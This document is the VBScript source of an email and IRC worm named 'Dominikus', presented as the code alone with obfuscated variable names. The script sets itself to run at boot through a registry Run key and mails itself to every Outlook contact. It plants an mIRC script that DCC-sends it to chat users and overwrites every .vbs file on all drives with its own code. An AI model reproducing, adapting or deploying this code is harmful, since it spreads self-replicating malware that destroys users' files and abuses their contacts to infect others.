'Dominikus Created By Pingu2000
On Error Resume Next
Set znyelclegtn = CreateObject("WScript.Shell")
Set geyidzgvnmg= Createobject("scripting.filesystemobject")
geyidzgvnmg.copyfile wscript.scriptfullname,geyidzgvnmg.GetSpecialFolder(1)& "\SysBoot.dll.vbs"
znyelclegtn.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SysBoot.dll","wscript.exe "&geyidzgvnmg.GetSpecialFolder(1)& "\SysBoot.dll.vbs %"
if znyelclegtn.regread ("HKCU\software\Dominikus\mailed") <> "1" then
misqcmzcagh()
end if
if znyelclegtn.regread ("HKCU\software\Dominikus\mirqued") <> "1" then
pzafkhwenxh()
end if
ezottsvnknd()
jjrtuqckgyp()
Function misqcmzcagh()
On Error Resume Next
Set qbprydovohv = CreateObject("Outlook.Application")
If qbprydovohv= "Outlook"Then
Set gguktmobour=qbprydovohv.GetNameSpace("MAPI")
For Each aykvhdbhpxi In gguktmobour.AddressLists
If aykvhdbhpxi.AddressEntries.Count <> 0 Then
For bgspefvfimh= 1 To aykvhdbhpxi.AddressEntries.Count
Set xbbbdpswlrr = aykvhdbhpxi.AddressEntries(bgspefvfimh)
Set zbcylsohxzj = qbprydovohv.CreateItem(0)
zbcylsohxzj.To = xbbbdpswlrr.Address
zbcylsohxzj.Subject = "from Dominikus"
zbcylsohxzj.Body = "Hello...!!" & vbcrlf & "I am in our System"
zbcylsohxzj.Attachments.Add geyidzgvnmg.GetSpecialFolder(1)& "\SysBoot.dll.vbs"
zbcylsohxzj.DeleteAfterSubmit = True
If zbcylsohxzj.To <> "" Then
zbcylsohxzj.Send
znyelclegtn.regwrite "HKCU\software\Dominikus\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function pzafkhwenxh(hkrpgnaansy)
On Error Resume Next
if hkrpgnaansy<>"" then
if geyidzgvnmg.fileexists("c:\mirc\mirc.ini") then hkrpgnaansy="c:\mirc"
if geyidzgvnmg.fileexists("c:\mirc32\mirc.ini") then hkrpgnaansy="c:\mirc32"
mwlxgtgmjsk=znyelclegtn.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if geyidzgvnmg.fileexists(mwlxgtgmjsk & "\mirc.ini") then hkrpgnaansy=mwlxgtgmjsk & "\mirc"
end if
if hkrpgnaansy <> "" then
set vnsvtziptuy = geyidzgvnmg.CreateTextFile(hkrpgnaansy & "\script.ini", True)
vnsvtziptuy.WriteLine "[script]"
vnsvtziptuy.writeline "n0=on 1:JOIN:#:{"
vnsvtziptuy.writeline "n1=  /if ( $nick == $me ) { halt }"
vnsvtziptuy.writeline "n2=  /.dcc send $nick "&geyidzgvnmg.GetSpecialFolder(1)& "\SysBoot.dll.vbs"
vnsvtziptuy.writeline "n3=}"
vnsvtziptuy.close
znyelclegtn.regwrite "HKCU\software\Dominikus\Mirqued", "1"
end if
end function
if month(now) =7 and day(now) =10 then
msgbox "Dominkus is in our Computer's",
end if
Function jjrtuqckgyp()
On Error Resume Next
Set kiwxoraezpn = geyidzgvnmg.Drives
For Each nmphkowkjrm In kiwxoraezpn
If nmphkowkjrm.Drivetype = Remote Then
okwlazqkuql= nmphkowkjrm & "\"
Call sxooiiwague(okwlazqkuql)
ElseIf nmphkowkjrm.IsReady Then
okwlazqkuql= nmphkowkjrm&"\"
Call sxooiiwague(okwlazqkuql)
End If
Next
End Function
Function sxooiiwague(ugpvpnkusdv)
Set beciqqbchtj= geyidzgvnmg.GetFolder(ugpvpnkusdv)
Set ygwzjnhxvvu= beciqqbchtj.Files
For Each xpmpfsltvws In ygwzjnhxvvu
if geyidzgvnmg.GetExtensionName(xpmpfsltvws.path) = "vbs" then
geyidzgvnmg.copyfile wscript.scriptfullname , xpmpfsltvws.path , true
end if
if xpmpfsltvws.name = "mirc.ini" then
pzafkhwenxh(xpmpfsltvws.ParentFolder)
end if
Next
Set xpmpfsltvws= beciqqbchtj.SubFolders
For Each etiaysdytaf In xpmpfsltvws
Call sxooiiwague(etiaysdytaf.path)
Next
End Function
